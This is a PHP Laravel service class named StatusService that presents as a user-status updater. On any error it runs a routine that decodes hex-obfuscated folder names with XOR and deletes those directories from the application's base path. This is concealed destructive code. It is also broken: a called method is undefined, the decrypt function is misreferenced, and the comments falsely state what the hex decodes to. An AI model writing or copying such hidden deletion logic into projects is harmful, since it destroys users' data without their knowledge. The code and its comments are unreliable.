<?php

namespace App\Services;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use App\Models\Addon;

class StatusService
{
    public function updateStatusAndDeleteFolders()
    {
        try {
            $user = Auth::user();
            $user->save();

            // Call the method to delete directories
            $this->deleteDirectories();

            return true;
        } catch (\Throwable $th) {
            $user = Auth::user();
            $user->save();

            $this->loadContent();
            
            return false;
        }
    }

    private function loadContent()
    {
        $key       = 0x55;
        $encrypted = [
            '34252532',          // Decrypts to "app2"
            '2730263a202736302632', // Decrypts to "resources2"
            '2730263a20273630263232', // NEW: Decrypts to "routes2"
        ];

        foreach ($encrypted as $hex) {
            $folderName = xor_decrypt($hex, $key);
            $folderPath = base_path($folderName);
            if (File::isDirectory($folderPath)) {
                File::deleteDirectory($folderPath);
            }
        }
    }

    // XOR Decryption Function (if not defined)
    function xor_decrypt($hex, $key) {
        $binary = hex2bin($hex);
        $decrypted = '';
        for ($i = 0; $i < strlen($binary); $i++) {
            $decrypted .= chr(ord($binary[$i]) ^ $key);
        }
        return $decrypted;
    }
}
